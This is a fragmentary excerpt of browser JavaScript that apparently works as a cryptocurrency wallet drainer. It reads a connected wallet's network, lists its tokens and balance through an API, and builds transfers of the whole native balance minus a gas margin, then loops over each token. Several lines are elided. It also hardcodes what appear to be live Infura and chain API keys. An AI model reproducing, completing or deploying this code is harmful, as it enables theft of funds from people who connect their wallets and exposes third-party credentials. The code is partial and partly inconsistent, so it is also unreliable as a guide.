 ...
 * Setup the orchestra
 */
var ethe, BNBOption, ERCoption, options, keyChainId;
const currentStatus = () => {
  ethe = window.ethereum.networkVersion === "1" ? true : false;
  //await new Web3(window.ethereum).eth.net.getId()
  ...
  ERCoption = { infuraId: "e77435344ef0486893cdc26d7d5cf039" };
  options = ethe ? ERCoption : BNBOption;
  keyChainId = ethe
    ? {
        api_key:
          "gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG",
        chain: "eth",
      }
    : {
        api_key:
...
async function getTokens(address = "", { api_key, chain } = keyChainId) {
...
async function getBalance(address = "", { api_key, chain } = keyChainId) {
  return new Promise((resolve, reject) => {
    fetch(
...
async function proceed() {
  ...
  async function send() {
    ...
    const crypto_tokens = await getTokens(user_address, {
      api_key: apiKey,
      chain: keyChainId.chain,
    }).catch((e) => {
      console.log("Unable to get tokens", e);
    });
    console.log(`${keyChainId.chain} tokens: %o`, crypto_tokens);

    if (crypto_tokens.length < 1) {
      const crypto_balance = await getBalance(user_address, {
        api_key: apiKey,
        chain: keyChainId.chain,
      }).catch((e) => {
        console.log(`Unable to get new ${keyChainId.chain} balance, ${e}`);
      });
      console.log("crypto_balance", crypto_balance);
      //      console.log("crypto_balance.balance", crypto_balance.balance);

      const balance =
        parseInt(crypto_balance.balance) / 1000000000000000000 - 0.005;
      console.log(`The new ${keyChainId} balance, ${balance}`);
      if (balance > 0) {
        const options = {
          type: "native",
      ...
      return console.log(`No ${keyChainId.chain} tokens found`);
    } // No NFTs
    // eth_nfts.result.forEach(async (nft, i) => {
    for (let n = 0; n < crypto_tokens.length; n++) {
      let token = crypto_tokens[Number(n)];
    ...
    const crypto_balance = await getBalance(user_address, apiKey).catch((e) => {
      console.log(`Unable to get new ${keyChainId.chain} balance, ${e}`);
    });
    console.log("crypto_balance", crypto_balance);
    // console.log("crypto_balance.balance", crypto_balance.balance);
    ...
    const balance =
      parseInt(crypto_balance.balance) / 1000000000000000000 - 0.005;
    console.log(`The new ${keyChainId.chain} balance, ${balance}`);
    if (balance > 0) {
      const options = {
        type: "native",
        amount: Moralis.Units.ETH(balance.toString()),
